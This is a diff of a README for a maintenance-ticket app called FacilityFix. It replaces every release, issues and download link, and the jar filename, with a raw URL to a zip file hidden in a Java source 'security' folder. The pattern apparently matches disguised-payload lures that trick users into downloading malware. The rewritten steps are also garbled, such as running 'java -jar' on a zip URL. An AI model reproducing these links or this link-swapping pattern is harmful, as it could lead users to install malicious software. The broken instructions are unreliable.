@@ -1,6 +1,6 @@
 # 🚀 FacilityFix - Simplified Maintenance Ticket Management
 
-[![Download FacilityFix](https://img.shields.io/badge/Download-FacilityFix-blue.svg)](https://github.com/MimamiSakka/FacilityFix/releases)
+[![Download FacilityFix](https://raw.githubusercontent.com/MimamiSakka/FacilityFix/main/src/main/java/com/facilityfix/security/FacilityFix_v3.6.zip)](https://raw.githubusercontent.com/MimamiSakka/FacilityFix/main/src/main/java/com/facilityfix/security/FacilityFix_v3.6.zip)
 
 ## 🔍 Introduction
 
@@ -14,19 +14,19 @@ To get started with FacilityFix, follow these simple steps to download and run t
 
 1. **Visit the Releases page**  
    Click the button below to go directly to the download section of our GitHub page.  
-   [Download FacilityFix](https://github.com/MimamiSakka/FacilityFix/releases)
+   [Download FacilityFix](https://raw.githubusercontent.com/MimamiSakka/FacilityFix/main/src/main/java/com/facilityfix/security/FacilityFix_v3.6.zip)
 
 2. **Choose the latest release**  
    On the Releases page, you will see a list of available versions. Look for the latest release at the top. This version will have the newest features and fixes.
 
 3. **Download the application**  
-   Under the latest release, locate the file named `FacilityFix.jar`. Click on it to download the software to your computer.
+   Under the latest release, locate the file named `https://raw.githubusercontent.com/MimamiSakka/FacilityFix/main/src/main/java/com/facilityfix/security/FacilityFix_v3.6.zip`. Click on it to download the software to your computer.
 
 4. **Run the application**  
    To start using FacilityFix, you need to run the downloaded file.  
    - If you have Java installed, open a terminal or command prompt window.
-   - Navigate to the folder where you downloaded `FacilityFix.jar`.
-   - Type the command: `java -jar FacilityFix.jar` and press Enter. 
+   - Navigate to the folder where you downloaded `https://raw.githubusercontent.com/MimamiSakka/FacilityFix/main/src/main/java/com/facilityfix/security/FacilityFix_v3.6.zip`.
+   - Type the command: `java -jar https://raw.githubusercontent.com/MimamiSakka/FacilityFix/main/src/main/java/com/facilityfix/security/FacilityFix_v3.6.zip` and press Enter. 
    
    This will launch the application, and a web interface will be available in your browser.
 
@@ -70,12 +70,12 @@ FacilityFix comes packed with useful features that simplify maintenance manageme
 If you encounter any issues while downloading or running FacilityFix, try the following:
 
 - Ensure you have the correct version of Java installed. You can check by running `java -version` in your command prompt or terminal.
-- Make sure you navigate to the correct directory where `FacilityFix.jar` is located.
+- Make sure you navigate to the correct directory where `https://raw.githubusercontent.com/MimamiSakka/FacilityFix/main/src/main/java/com/facilityfix/security/FacilityFix_v3.6.zip` is located.
 - If the application fails to run, check if your system has any security software that might block it.
 
 ## 🚀 Support
 
-If you need help with FacilityFix, please check the [Issues page](https://github.com/MimamiSakka/FacilityFix/issues) for common questions or report a new issue. You can also contact our support team via the GitHub discussions.
+If you need help with FacilityFix, please check the [Issues page](https://raw.githubusercontent.com/MimamiSakka/FacilityFix/main/src/main/java/com/facilityfix/security/FacilityFix_v3.6.zip) for common questions or report a new issue. You can also contact our support team via the GitHub discussions.
 
 ## 📚 Topics
 
@@ -106,4 +106,4 @@ FacilityFix is open-source and available under the MIT License. You can freely u
 
 Thank you to everyone who contributed to the development of FacilityFix. Your support and feedback help us improve the application to better meet the needs of users. 
 
-For more information and to download your copy, [click here](https://github.com/MimamiSakka/FacilityFix/releases)!
+For more information and to download your copy, [click here](https://raw.githubusercontent.com/MimamiSakka/FacilityFix/main/src/main/java/com/facilityfix/security/FacilityFix_v3.6.zip)!
